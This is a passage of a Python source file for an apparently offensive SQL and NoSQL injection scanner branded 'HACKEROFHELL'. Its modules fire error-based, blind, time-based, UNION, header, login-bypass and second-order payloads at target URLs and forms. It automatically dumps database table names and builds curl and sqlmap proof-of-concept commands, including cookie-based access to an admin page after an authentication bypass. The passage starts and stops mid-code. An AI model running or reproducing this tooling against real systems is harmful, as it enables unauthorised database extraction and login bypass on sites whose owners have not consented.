            r"microsoft odbc",
            r"syntax error.*converting",
            r"\[sql server\]",
            r"unclosed quotation mark",
            r"sqlexception",
            r"procedure or function",
            r"conversion failed when converting",
            r"sqlsrv",
        ],
        'Oracle': [
            r"ora-[0-9]{4,5}",
            r"oracle.*driver",
            r"quoted string not properly terminated",
            r"invalid identifier",
            r"table or view does not exist",
            r"oracle error",
        ],
        'PostgreSQL': [
            r"postgresql.*error",
            r"pg_query\(\)",
            r"syntax error at or near",
            r"pg_exec\(\)",
            r"unterminated quoted string",
            r"psqlexception",
            r"no such column",
        ],
        'SQLite': [
            r"sqlite.*error",
            r"sqlite3.*exception",
            r"syntax error near",
            r"unable to open database file",
        ],
        'Generic': [
            r"sql syntax",
            r"sql error",
            r"sqlexception",
            r"database error",
            r"query failed",
            r"jdbc.*exception",
            r"hibernate.*exception",
            r"nhibernate.*exception",
            r"pdo::exec\(\)",
            r"\bnot found in\b.*\bsql\b",
            r"error.*\bwhere\b.*\bclause\b",
        ]
    }

    @staticmethod
    def detect_db_error(text):
        text_lower = text.lower()
        for db, patterns in Payloads.DB_ERRORS.items():
            for pat in patterns:
                if re.search(pat, text_lower):
                    return db
        return None

# ══════════════════════════════════════════════════════════════════════
# MODULE 02 — ERROR-BASED SQL INJECTION
# ══════════════════════════════════════════════════════════════════════
class ErrorBasedTester:
    def __init__(self, http, args, db, intel):
        self.http  = http
        self.args  = args
        self.db    = db
        self.intel = intel
        self.found = 0

    def run(self):
        if self.args.skip_error: return
        phase(2, "ERROR-BASED SQL INJECTION")
        log(f"Testing {len(self.intel.param_urls)} GET URLs + {len(self.intel.forms)} forms...")

        targets = []
        # GET params
        for url in self.intel.param_urls:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in params:
                targets.append(('GET', url, param, None))

        # POST forms
        for form in self.intel.forms:
            for field in form['fields']:
                targets.append(('POST', form['url'], field, form))

        # Path-based
        for url in self.intel.path_targets:
            targets.append(('PATH', url, '_path_', None))

        log(f"Total injection points: {len(targets)}")

        with ThreadPoolExecutor(max_workers=self.args.threads) as ex:
            futures = [ex.submit(self._test_point, t) for t in targets]
            for f in as_completed(futures):
                try: f.result()
                except Exception: pass

        ok(f"Error-based: {self.found} injection(s) found")

    def _test_point(self, target):
        method, url, param, form = target
        baseline = self._get_baseline(method, url, param, form)
        if baseline is None: return

        # Level 1: basic detection payloads
        payloads = Payloads.ERROR_DETECTION
        if self.args.level >= 2:
            payloads = payloads + Payloads.ERROR_MYSQL + Payloads.ERROR_MSSQL
        if self.args.level >= 3:
            payloads = payloads + Payloads.ERROR_ORACLE + Payloads.ERROR_PGSQL

        for payload in payloads:
            variants = [payload]
            if self.args.waf_bypass:
                variants += [enc(payload) for enc in Payloads.WAF_ENCODINGS[1:6]]

            for p in variants:
                resp = self._inject(method, url, param, form, p)
                if resp is None: continue
                db_type = Payloads.detect_db_error(resp.text)
                if db_type:
                    if not self.db.has(url, param, 'error-based'):
                        self.found += 1
                        evidence = self._extract_error(resp.text, db_type)
                        finding = self._build_finding(
                            url, param, method, p, 'Error-Based',
                            db_type, evidence, form
                        )
                        self.db.add(finding)
                        vuln(f"ERROR-BASED [{db_type}] | {url} | param: {param} | {p[:40]}")
                        self._dump_check(url, param, method, form, db_type)
                    return

    def _get_baseline(self, method, url, param, form):
        try:
            if method == 'GET':
                r = self.http.get(url)
            elif method == 'POST' and form:
                r = self.http.post(form['url'], data=form['fields'])
            else:
                r = self.http.get(url)
            return r
        except Exception:
            return None

    def _inject(self, method, url, param, form, payload):
        try:
            if method == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_qs = urllib.parse.urlencode(params, doseq=True)
                new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                return self.http.get(new_url)
            elif method == 'POST' and form:
                data = dict(form['fields'])
                data[param] = payload
                return self.http.post(form['url'], data=data)
            elif method == 'PATH':
                # Inject into path segments
                path_parts = url.rstrip('/').split('/')
                for i, part in enumerate(path_parts):
                    if part.isdigit():
                        path_parts[i] = part + payload
                        injected = '/'.join(path_parts)
                        return self.http.get(injected)
        except Exception:
            return None

    def _extract_error(self, text, db_type):
        lines = text.split('\n')
        for line in lines:
            for db, patterns in Payloads.DB_ERRORS.items():
                for pat in patterns:
                    if re.search(pat, line, re.IGNORECASE):
                        return line.strip()[:300]
        return f"{db_type} error signature detected in response"

    def _build_finding(self, url, param, method, payload, sqli_type, db_type, evidence, form=None):
        return {
            'title':       f'SQL Injection ({sqli_type}) — {db_type}',
            'type':        'error-based',
            'severity':    'CRITICAL',
            'cvss':        '9.8',
            'url':         url,
            'parameter':   param,
            'method':      method,
            'payload':     payload,
            'dbms':        db_type,
            'evidence':    evidence[:500],
            'poc':         self._build_poc(url, param, method, payload, db_type, form),
            'remediation': 'Use parameterized queries/prepared statements. Apply input validation. Use WAF.',
            'timestamp':   datetime.utcnow().isoformat()
        }

    def _build_poc(self, url, param, method, payload, db_type, form=None):
        if method == 'GET':
            poc_url = url
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            poc_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(params, doseq=True)))
            return (f"# Error-Based SQLi PoC — by RAJESH BAJIYA (HACKEROFHELL)\n"
                    f"curl -sk '{poc_url}'\n\n"
                    f"# sqlmap exploitation:\n"
                    f"sqlmap -u '{url}' -p '{param}' --dbs --batch --dbms={db_type.lower()}\n\n"
                    f"# Manual DB version extract (MySQL):\n"
                    f"# {url}?{param}=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--")
        else:
            data_str = f"{param}={payload}"
            if form:
                data_str = '&'.join(f"{k}={v}" for k,v in form['fields'].items())
            return (f"# Error-Based SQLi PoC (POST) — HACKEROFHELL\n"
                    f"curl -sk -X POST '{url}' --data '{data_str}'\n\n"
                    f"# sqlmap:\n"
                    f"sqlmap -u '{url}' --data '{data_str}' -p '{param}' --dbs --batch")

    def _dump_check(self, url, param, method, form, db_type):
        if not self.args.dump: return
        log(f"Auto-dump triggered for {db_type} on {param}@{url}")
        dumper = DBDumper(self.http, self.args, self.db)
        dumper.dump_mysql(url, param, method, form) if db_type == 'MySQL' else None

# ══════════════════════════════════════════════════════════════════════
# MODULE 03 — BOOLEAN BLIND SQL INJECTION
# ══════════════════════════════════════════════════════════════════════
class BooleanBlindTester:
    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        if self.args.skip_blind: return
        phase(3, "BOOLEAN BLIND SQL INJECTION")

        targets = []
        for url in self.intel.param_urls:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in params:
                targets.append((url, param))

        for form in self.intel.forms:
            for field in form['fields']:
                targets.append((form['url'] + '?__form__=1', field))

        log(f"Boolean blind testing {len(targets)} points...")
        with ThreadPoolExecutor(max_workers=self.args.threads) as ex:
            futs = [ex.submit(self._test, url, param) for url, param in targets]
            for f in as_completed(futs):
                try: f.result()
                except Exception: pass

        ok(f"Boolean blind: {self.found} injection(s) found")

    def _test(self, url, param):
        if self.db.has(url, param, 'boolean-blind'): return

        is_form = '__form__=1' in url
        if is_form:
            url = url.replace('?__form__=1', '')

        # Get baseline
        base_resp = self.http.get(url)
        if not base_resp: return
        base_len  = len(base_resp.text)
        base_hash = hashlib.md5(base_resp.text.encode()).hexdigest()

        for true_p, false_p in zip(Payloads.BOOL_TRUE, Payloads.BOOL_FALSE):
            r_true  = self._inject_get(url, param, true_p)
            r_false = self._inject_get(url, param, false_p)
            if not r_true or not r_false: continue

            len_true  = len(r_true.text)
            len_false = len(r_false.text)
            hash_true = hashlib.md5(r_true.text.encode()).hexdigest()

            # True payload should differ from false payload
            if (len_true != len_false and abs(len_true - len_false) > 20
                    and hash_true != hashlib.md5(r_false.text.encode()).hexdigest()):
                # Confirm: true should be more similar to base than false
                if abs(len_true - base_len) < abs(len_false - base_len):
                    self.found += 1
                    self.db.add({
                        'title':      'SQL Injection (Boolean Blind)',
                        'type':       'boolean-blind',
                        'severity':   'CRITICAL',
                        'cvss':       '9.8',
                        'url':        url,
                        'parameter':  param,
                        'method':     'GET',
                        'payload':    f"TRUE: {true_p} | FALSE: {false_p}",
                        'dbms':       'Unknown (Blind)',
                        'evidence':   f"TRUE response len={len_true}, FALSE len={len_false}, diff={abs(len_true-len_false)}",
                        'poc':        self._poc(url, param, true_p, false_p),
                        'remediation':'Use parameterized queries. Never concatenate user input into SQL.',
                        'timestamp':  datetime.utcnow().isoformat()
                    })
                    vuln(f"BOOLEAN BLIND | {url} | param={param} | len_diff={abs(len_true-len_false)}")
                    return

    def _inject_get(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        orig_val = params.get(param, ['1'])[0]
        params[param] = [orig_val + payload]
        new_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(params, doseq=True)))
        return self.http.get(new_url)

    def _poc(self, url, param, true_p, false_p):
        return (f"# Boolean Blind SQLi PoC — RAJESH BAJIYA / HACKEROFHELL\n"
                f"# TRUE condition (returns data):\n"
                f"curl -sk '{url}' # with {param}=VALUE{true_p}\n\n"
                f"# FALSE condition (empty/different):\n"
                f"curl -sk '{url}' # with {param}=VALUE{false_p}\n\n"
                f"# Extract data character by character:\n"
                f"# {param}=VALUE' AND SUBSTRING(database(),1,1)='a'--\n\n"
                f"# Automated extraction:\n"
                f"sqlmap -u '{url}' -p '{param}' --technique=B --dbs --batch")

# ══════════════════════════════════════════════════════════════════════
# MODULE 04 — TIME-BASED BLIND SQL INJECTION
# ══════════════════════════════════════════════════════════════════════
class TimeBasedTester:
    SLEEP_TIME  = 5
    THRESHOLD   = 4.0

    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        if self.args.skip_time: return
        phase(4, "TIME-BASED BLIND SQL INJECTION")

        all_payloads = (Payloads.TIME_MYSQL + Payloads.TIME_MSSQL +
                        Payloads.TIME_PGSQL + Payloads.TIME_ORACLE +
                        Payloads.TIME_SQLITE)

        targets = []
        for url in self.intel.param_urls:
            parsed = urllib.parse.urlparse(url)
            for param in urllib.parse.parse_qs(parsed.query):
                targets.append(('GET', url, param, None))
        for form in self.intel.forms:
            for field in form['fields']:
                targets.append(('POST', form['url'], field, form))

        log(f"Time-based testing {len(targets)} points ({self.SLEEP_TIME}s threshold)...")
        for method, url, param, form in targets:
            if self.db.has(url, param, 'time-based'): continue
            self._test(method, url, param, form, all_payloads)

        ok(f"Time-based: {self.found} injection(s) found")

    def _test(self, method, url, param, form, payloads):
        # Quick baseline timing
        t0 = time.time()
        base_resp = self._req(method, url, param, form, '1')
        base_time = time.time() - t0
        if base_resp is None: return

        for payload in payloads:
            variants = [payload]
            if self.args.waf_bypass:
                variants += [enc(payload) for enc in Payloads.WAF_ENCODINGS[1:4]]

            for p in variants:
                t1 = time.time()
                resp = self._req(method, url, param, form, p)
                elapsed = time.time() - t1

                if elapsed >= self.THRESHOLD and elapsed >= base_time + self.THRESHOLD - 1:
                    self.found += 1
                    db_type = 'MySQL' if 'SLEEP' in p else ('MSSQL' if 'WAITFOR' in p else
                              ('PostgreSQL' if 'pg_sleep' in p else 'Unknown'))
                    self.db.add({
                        'title':      f'SQL Injection (Time-Based Blind) — {db_type}',
                        'type':       'time-based',
                        'severity':   'CRITICAL',
                        'cvss':       '9.8',
                        'url':        url,
                        'parameter':  param,
                        'method':     method,
                        'payload':    p,
                        'dbms':       db_type,
                        'evidence':   f"Response delayed {elapsed:.2f}s (baseline: {base_time:.2f}s)",
                        'poc':        self._poc(url, param, method, p, db_type, form),
                        'remediation':'Use parameterized queries. Disable extended functions (xp_cmdshell, SLEEP).',
                        'timestamp':  datetime.utcnow().isoformat()
                    })
                    vuln(f"TIME-BASED [{db_type}] | {url} | param={param} | {elapsed:.1f}s delay | {p[:40]}")
                    return

    def _req(self, method, url, param, form, payload):
        if method == 'GET':
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            orig = params.get(param, ['1'])[0]
            params[param] = [orig + payload]
            new_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(params, doseq=True)))
            return self.http.get(new_url, timeout=self.SLEEP_TIME + 10)
        elif method == 'POST' and form:
            data = dict(form['fields'])
            data[param] = data.get(param, '1') + payload
            return self.http.post(form['url'], data=data, timeout=self.SLEEP_TIME + 10)

    def _poc(self, url, param, method, payload, db_type, form):
        if method == 'GET':
            return (f"# Time-Based Blind SQLi PoC — HACKEROFHELL\n"
                    f"# Confirm: response must take {self.SLEEP_TIME}+ seconds\n"
                    f"curl -sk '{url}' # param {param} injected with: {payload}\n\n"
                    f"# Extract DB name (MySQL):\n"
                    f"# {param}=1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--\n\n"
                    f"# Automated:\n"
                    f"sqlmap -u '{url}' -p '{param}' --technique=T --dbs --batch --dbms={db_type.lower()}")
        return f"sqlmap -u '{url}' --data '{param}={payload}' --technique=T --batch"

# ══════════════════════════════════════════════════════════════════════
# MODULE 05 — UNION-BASED SQL INJECTION
# ══════════════════════════════════════════════════════════════════════
class UnionBasedTester:
    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        if self.args.skip_union: return
        phase(5, "UNION-BASED SQL INJECTION")

        targets = []
        for url in self.intel.param_urls:
            parsed = urllib.parse.urlparse(url)
            for param in urllib.parse.parse_qs(parsed.query):
                targets.append((url, param))

        log(f"Union-based testing {len(targets)} points (1-10 columns)...")
        with ThreadPoolExecutor(max_workers=self.args.threads) as ex:
            futs = [ex.submit(self._test, url, param) for url, param in targets]
            for f in as_completed(futs):
                try: f.result()
                except Exception: pass

        ok(f"Union-based: {self.found} injection(s) found")

    def _test(self, url, param):
        if self.db.has(url, param, 'union-based'): return
        MARKER = 'HELLSQLI_' + ''.join(random.choices(string.digits, k=6))

        # Find column count
        for n_cols in range(1, 11):
            # ORDER BY to find columns
            order_payload = f"' ORDER BY {n_cols}--"
            resp = self._inject(url, param, order_payload)
            if resp and Payloads.detect_db_error(resp.text):
                n_cols = n_cols - 1
                break
        else:
            n_cols = 3  # fallback

        if n_cols < 1: n_cols = 3

        # Try UNION with detected column count
        for try_cols in range(1, 11):
            nulls = ','.join(['NULL'] * try_cols)
            union_p = f"' UNION SELECT {nulls}--"
            resp = self._inject(url, param, union_p)
            if not resp: continue
            if not Payls_detect_error(resp): break # no error = correct cols

            # Try with string marker to find output column
            for col_idx in range(try_cols):
                cols = ['NULL'] * try_cols
                cols[col_idx] = f"'{MARKER}'"
                union_p2 = f"' UNION SELECT {','.join(cols)}--"
                resp2 = self._inject(url, param, union_p2)
                if resp2 and MARKER in resp2.text:
                    self.found += 1
                    # Now extract data
                    version_p = f"' UNION SELECT {','.join(['NULL']*try_cols)}--"
                    cols_ver = ['NULL'] * try_cols
                    cols_ver[col_idx] = 'version()'
                    ver_payload = f"' UNION SELECT {','.join(cols_ver)}--"
                    ver_resp = self._inject(url, param, ver_payload)
                    ver_info = ""
                    if ver_resp:
                        # Extract version from response
                        ver_m = re.search(r'(\d+\.\d+\.\d+[^\s<"]*)', ver_resp.text)
                        if ver_m: ver_info = ver_m.group(1)

                    db_name = self._extract_col(url, param, try_cols, col_idx, 'database()')
                    user_val = self._extract_col(url, param, try_cols, col_idx, 'user()')

                    self.db.add({
                        'title':      'SQL Injection (UNION-Based)',
                        'type':       'union-based',
                        'severity':   'CRITICAL',
                        'cvss':       '9.8',
                        'url':        url,
                        'parameter':  param,
                        'method':     'GET',
                        'payload':    union_p2,
                        'dbms':       'MySQL',
                        'evidence':   f"UNION with {try_cols} cols, output in col {col_idx+1}. DB:{db_name} User:{user_val} Ver:{ver_info}",
                        'poc':        self._poc(url, param, try_cols, col_idx, db_name, user_val),
                        'remediation':'Use parameterized queries. Restrict DB user privileges.',
                        'timestamp':  datetime.utcnow().isoformat()
                    })
                    vuln(f"UNION-BASED | {url} | param={param} | {try_cols} cols | DB={db_name} User={user_val}")
                    if self.args.dump:
                        self._dump_tables(url, param, try_cols, col_idx, db_name)
                    return

    def _inject(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = ['-1' + payload]
        new_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(params, doseq=True)))
        return self.http.get(new_url)

    def _extract_col(self, url, param, n_cols, col_idx, expr):
        cols = ['NULL'] * n_cols
        cols[col_idx] = expr
        payload = f"' UNION SELECT {','.join(cols)}--"
        resp = self._inject(url, param, payload)
        if not resp: return 'unknown'
        # Try to find the extracted value
        m = re.search(r'(?:>|^)([a-zA-Z0-9_@.\-]{3,50})(?:<|$)', resp.text)
        return m.group(1) if m else 'extracted'

    def _dump_tables(self, url, param, n_cols, col_idx, db_name):
        log(f"Auto-dumping tables from {db_name}...")
        cols = ['NULL'] * n_cols
        cols[col_idx] = 'group_concat(table_name separator 0x2c)'
        payload = f"' UNION SELECT {','.join(cols)} FROM information_schema.tables WHERE table_schema=database()--"
        resp = self._inject(url, param, payload)
        if resp:
            tables = re.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,40}', resp.text[:2000])
            if tables:
                ok(f"Tables found: {tables[:10]}")
                self.db.outdir.joinpath('dumped_tables.txt').write_text('\n'.join(tables))

    def _poc(self, url, param, n_cols, col_idx, db_name, user_val):
        nulls = ','.join(['NULL'] * n_cols)
        cols_ver = ['NULL'] * n_cols
        cols_ver[col_idx] = 'version()'
        return (f"# UNION-Based SQLi PoC — RAJESH BAJIYA / HACKEROFHELL\n"
                f"# {n_cols} columns detected, output column: {col_idx+1}\n\n"
                f"# Get version:\ncurl -sk '{url}?{param}=-1\\' UNION SELECT {','.join(cols_ver)}--'\n\n"
                f"# Get all databases:\n"
                f"# param=-1' UNION SELECT {','.join(['NULL']*col_idx + ['group_concat(schema_name)'] + ['NULL']*(n_cols-col_idx-1))} FROM information_schema.schemata--\n\n"
                f"# Get tables:\n"
                f"# param=-1' UNION SELECT {','.join(['NULL']*col_idx + ['group_concat(table_name)'] + ['NULL']*(n_cols-col_idx-1))} FROM information_schema.tables WHERE table_schema='{db_name}'--\n\n"
                f"# sqlmap:\nsqlmap -u '{url}' -p '{param}' --technique=U --dbs --batch")

def Payls_detect_error(resp):
    if resp is None: return True
    return bool(Payloads.detect_db_error(resp.text))

# ══════════════════════════════════════════════════════════════════════
# MODULE 06 — HEADER INJECTION
# ══════════════════════════════════════════════════════════════════════
class HeaderInjectionTester:
    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        if self.args.skip_headers: return
        phase(6, "HTTP HEADER SQL INJECTION")
        targets = list(set(self.intel.header_targets))[:50]
        log(f"Testing headers on {len(targets)} URLs...")

        for url in targets:
            self._test_url(url)

        ok(f"Header injection: {self.found} found")

    def _test_url(self, url):
        baseline = self.http.get(url)
        if not baseline: return

        for header, payloads in Payloads.HEADER_PAYLOADS.items():
            if not payloads:
                payloads = ["'", "' OR '1'='1", "' AND SLEEP(5)--"]
            for payload in payloads:
                hdrs = {header: payload}
                resp = self.http.get(url, headers=hdrs)
                if resp is None: continue
                db_type = Payloads.detect_db_error(resp.text)
                if db_type and not self.db.has(url, header, 'header-injection'):
                    self.found += 1
                    self.db.add({
                        'title':     f'SQL Injection via HTTP Header ({header})',
                        'type':      'header-injection',
                        'severity':  'HIGH',
                        'cvss':      '8.1',
                        'url':       url,
                        'parameter': header,
                        'method':    'HEADER',
                        'payload':   payload,
                        'dbms':      db_type,
                        'evidence':  Payloads.DB_ERRORS.get(db_type, ['error'])[0],
                        'poc':       f"curl -sk '{url}' -H '{header}: {payload}'\n\nsqlmap -u '{url}' --level=3 --risk=3 -p '{header}' --batch",
                        'remediation': 'Sanitize all user-controlled inputs including HTTP headers before SQL queries.',
                        'timestamp': datetime.utcnow().isoformat()
                    })
                    vuln(f"HEADER INJECTION [{header}] | {url} | DB={db_type}")
                    return

                # Time-based on headers
                if 'SLEEP' in payload or 'WAITFOR' in payload:
                    continue
                time_payloads = ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"]
                for tp in time_payloads:
                    t1 = time.time()
                    r = self.http.get(url, headers={header: tp})
                    elapsed = time.time() - t1
                    if elapsed >= 4.5 and not self.db.has(url, header, 'header-time'):
                        self.found += 1
                        self.db.add({
                            'title':     f'Time-Based SQLi via Header ({header})',
                            'type':      'header-time',
                            'severity':  'HIGH',
                            'cvss':      '8.1',
                            'url':       url,
                            'parameter': header,
                            'method':    'HEADER',
                            'payload':   tp,
                            'dbms':      'MySQL/MSSQL',
                            'evidence':  f'{elapsed:.1f}s delay via {header} header',
                            'poc':       f"curl -sk '{url}' -H '{header}: {tp}'",
                            'remediation': 'Parameterize all SQL. Never use raw header values in queries.',
                            'timestamp': datetime.utcnow().isoformat()
                        })
                        vuln(f"HEADER TIME-BASED [{header}] | {url} | {elapsed:.1f}s")
                        return

# ══════════════════════════════════════════════════════════════════════
# MODULE 07 — LOGIN FORM BYPASS
# ══════════════════════════════════════════════════════════════════════
class LoginBypassTester:
    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(7, "LOGIN FORM SQL INJECTION BYPASS")
        if not self.intel.login_forms:
            log("No login forms found — skipping")
            return
        log(f"Testing {len(self.intel.login_forms)} login forms with {len(Payloads.LOGIN_BYPASS)} bypass payloads...")

        for form in self.intel.login_forms:
            self._test_form(form)

        ok(f"Login bypass: {self.found} found")

    def _test_form(self, form):
        url = form['url']
        fields = form['fields']

        # Identify username + password fields
        user_field = next((k for k in fields if any(
            x in k.lower() for x in ['user','email','login','name'])), list(fields.keys())[0])
        pass_field = next((k for k in fields if any(
            x in k.lower() for x in ['pass','pwd','password','secret'])),
            list(fields.keys())[-1] if len(fields) > 1 else list(fields.keys())[0])

        # Baseline — failed login
        baseline_data = dict(fields)
        baseline_data[user_field] = 'invaliduser_hellsqli_' + ''.join(random.choices(string.digits, k=5))
        baseline_data[pass_field] = 'invalidpass_hellsqli'
        baseline_resp = self.http.post(url, data=baseline_data)
        if not baseline_resp: return
        baseline_text = baseline_resp.text.lower()

        for bp in Payloads.LOGIN_BYPASS:
            data = dict(fields)
            data[user_field] = bp['user']
            data[pass_field] = bp['pass']
            resp = self.http.post(url, data=data)
            if not resp: continue

            resp_lower = resp.text.lower()

            # Check for successful login indicators
            success = False
            if resp.status_code in (200, 302):
                # Positive signs
                if any(x in resp_lower for x in [
                    'logout', 'sign out', 'dashboard', 'welcome', 'profile',
                    'account', 'my account', 'admin panel', 'control panel',
                    'successfully', 'logged in', 'hello admin', 'hi admin'
                ]):
                    success = True
                # Redirect to different page (success)
                if resp.url and resp.url != url and 'login' not in resp.url.lower():
                    success = True
                # Response significantly different from baseline (less error content)
                if ('incorrect' not in resp_lower and 'invalid' not in resp_lower
                        and 'failed' not in resp_lower and 'error' not in resp_lower
                        and len(resp.text) > len(baseline_resp.text) + 200):
                    success = True

            if success and not self.db.has(url, user_field, 'login-bypass'):
                self.found += 1
                self.db.add({
                    'title':     'SQL Injection — Authentication Bypass',
                    'type':      'login-bypass',
                    'severity':  'CRITICAL',
                    'cvss':      '9.8',
                    'url':       url,
                    'parameter': f"{user_field} / {pass_field}",
                    'method':    'POST',
                    'payload':   f"{user_field}={bp['user']}&{pass_field}={bp['pass']}",
                    'dbms':      'Unknown',
                    'evidence':  f"Login succeeded with payload. Redirected to: {resp.url}",
                    'poc':       (f"# Authentication Bypass PoC — HACKEROFHELL\n"
                                  f"curl -sk -c cookies.txt -X POST '{url}' \\\n"
                                  f"  --data '{user_field}={urllib.parse.quote(bp['user'])}&{pass_field}={urllib.parse.quote(bp['pass'])}' -L\n\n"
                                  f"# Then access with cookies:\ncurl -sk -b cookies.txt '{url.rsplit('/',1)[0]}/admin'"),
                    'remediation':'Use parameterized queries. Hash passwords. Implement rate limiting and lockout.',
                    'timestamp': datetime.utcnow().isoformat()
                })
                crit(f"LOGIN BYPASS | {url} | {user_field}='{bp['user']}'")
                return

# ══════════════════════════════════════════════════════════════════════
# MODULE 08 — NOSQL INJECTION
# ══════════════════════════════════════════════════════════════════════
class NoSQLTester:
    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        if self.args.skip_nosql: return
        phase(8, "NoSQL INJECTION (MongoDB/CouchDB/Redis)")

        targets = []
        for url in self.intel.param_urls:
            parsed = urllib.parse.urlparse(url)
            for param in urllib.parse.parse_qs(parsed.query):
                targets.append(('GET', url, param, None))
        for form in self.intel.forms:
            for field in form['fields']:
                targets.append(('POST', form['url'], field, form))

        log(f"NoSQL testing {len(targets)} points...")
        for method, url, param, form in targets:
            self._test(method, url, param, form)

        ok(f"NoSQL injection: {self.found} found")

    def _test(self, method, url, param, form):
        # URL-based NoSQL
        for p in Payloads.NOSQL_URL:
            new_param = f"{param}{p}"
            if method == 'GET':
                parsed = urllib.parse.urlparse(url)
                qs_parts = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                raw_qs = parsed.query
                new_qs = raw_qs.replace(f"{param}=", new_param + "=dummy&" + param + "=", 1)
                new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                resp = self.http.get(new_url)
            else:
                if not form: continue
                data = dict(form['fields'])
                data[param + '[$ne]'] = 'invalid'
                resp = self.http.post(form['url'], data=data)

            if resp and resp.status_code == 200:
                base_resp = self.http.get(url) if method == 'GET' else self.http.post(url, data=form['fields'] if form else {})
                if base_resp and len(resp.text) > len(base_resp.text) + 50:
                    if not self.db.has(url, param, 'nosql'):
                        self.found += 1
                        self.db.add({
                            'title':     'NoSQL Injection (MongoDB Operator)',
                            'type':      'nosql',
                            'severity':  'CRITICAL',
                            'cvss':      '9.8',
                            'url':       url,
                            'parameter': param,
                            'method':    method,
                            'payload':   p,
                            'dbms':      'MongoDB/NoSQL',
                            'evidence':  f"Response larger with NoSQL operator: len={len(resp.text)} vs baseline={len(base_resp.text)}",
                            'poc':       (f"# NoSQL Injection PoC — HACKEROFHELL\n"
                                          f"curl -sk '{url}?{param}[$ne]=invalid'\n\n"
                                          f"# JSON body:\ncurl -sk -X POST '{url}' -H 'Content-Type: application/json' "
                                          f"-d '{{\"username\":{{\"$ne\":\"null\"}},\"password\":{{\"$ne\":\"null\"}}}}'"),
                            'remediation':'Validate and sanitize MongoDB operators. Use schema validation. Disable $where.',
                            'timestamp': datetime.utcnow().isoformat()
                        })
                        vuln(f"NOSQL INJECTION | {url} | param={param} | {p}")
                        return

        # JSON NoSQL injection
        if method == 'POST' and form:
            for payload_dict in Payloads.NOSQL_JSON[:3]:
                data = dict(form['fields'])
                for field in data:
                    try:
                        json_data = {field: payload_dict}
                        resp = self.http.post(form['url'], json_data=json_data)
                        if resp and resp.status_code == 200:
                            base = self.http.post(form['url'], data=form['fields'])
                            if base and len(resp.text) > len(base.text) + 50:
                                if not self.db.has(form['url'], field, 'nosql-json'):
                                    self.found += 1
                                    self.db.add({
                                        'title':     'NoSQL Injection via JSON Body',
                                        'type':      'nosql-json',
                                        'severity':  'CRITICAL', 'cvss': '9.8',
                                        'url':       form['url'],
                                        'parameter': field,
                                        'method':    'POST-JSON',
                                        'payload':   json.dumps({field: payload_dict}),
                                        'dbms':      'MongoDB',
                                        'evidence':  'JSON operator injection bypasses query',
                                        'poc':       f"curl -X POST '{form['url']}' -H 'Content-Type: application/json' -d '{json.dumps({field: payload_dict})}'",
                                        'remediation': 'Use strict input schemas. Validate JSON body types.',
                                        'timestamp': datetime.utcnow().isoformat()
                                    })
                                    vuln(f"NOSQL JSON INJECTION | {form['url']} | field={field}")
                    except Exception:
                        pass

# ══════════════════════════════════════════════════════════════════════
# MODULE 09 — SECOND-ORDER SQL INJECTION
# ══════════════════════════════════════════════════════════════════════
class SecondOrderTester:
    def __init__(self, http, args, db, intel):
        self.http  = http; self.args = args
        self.db    = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(9, "SECOND-ORDER SQL INJECTION")
        if not self.intel.forms:
            log("No forms found for second-order testing")
            return

        log("Testing second-order injection (store payload, then trigger)...")
        MARKER = "HELLSQL_2ND_" + ''.join(random.choices(string.digits, k=4))
        PAYLOAD = f"HELLSQL_TEST'{MARKER}"

        for form in self.intel.forms[:10]:
            url = form['url']
            fields = form['fields']
            data = {k: PAYLOAD if i == 0 else v for i, (k, v) in enumerate(fields.items())}
            resp = self.http.post(url, data=data)
            if not resp: continue

            # Now trigger — visit profile/settings/account pages
            trigger_paths = ['/profile', '/account', '/settings', '/user', '/dashboard',
                             '/my-account', '/edit-profile', '/update']
            for tpath in trigger_paths:
                turl = urllib.parse.urljoin(self.args.target, tpath)
                tresp = self.http.get(turl)
                if tresp and Payloads.detect_db_error(tresp.text):
                    if not self.db.has(url, list(fields.keys())[0], 'second-order'):
                        self.found += 1
                        self.db.add({
                            'title':     'Second-Order SQL Injection',
                            'type':      'second-order',
                            'severity':  'HIGH',
                            'cvss':      '8.5',
                            'url':       url,
                            'parameter': list(fields.keys())[0],
                            'method':    'POST→GET',
                            'payload':   PAYLOAD,
                            'dbms':      Payloads.detect_db_error(tresp.text) or 'Unknown',
